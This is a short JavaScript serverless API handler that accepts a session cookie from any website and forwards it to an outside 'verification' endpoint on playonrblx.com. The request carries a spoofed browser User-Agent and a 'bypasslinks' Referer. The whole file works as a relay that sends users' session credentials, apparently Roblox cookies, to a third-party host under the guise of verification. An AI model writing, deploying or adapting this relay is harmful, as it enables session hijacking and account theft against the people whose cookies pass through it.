export default async function handler(req, res) {
  // Allow browser to call this API from any website
  res.setHeader("Access-Control-Allow-Origin", "*")
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS")
  res.setHeader("Access-Control-Allow-Headers", "Content-Type")

  if (req.method === "OPTIONS") {
    return res.status(200).end()
  }

  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" })
  }

  const { cookie } = req.body || {}
  if (!cookie) return res.status(400).json({ error: "cookie required" })

  try {
    const response = await fetch(
      "https://playonrblx.com/api/verification.php",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "User-Agent":
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
          "Referer": "https://playonrblx.com/a/bypasslinks/index"
        },
        body: JSON.stringify({ cookie })
      }
    )

    const text = await response.text()
    res.status(200).send(text)
  } catch (err) {
    res.status(500).json({ error: "Request failed" })
  }
}
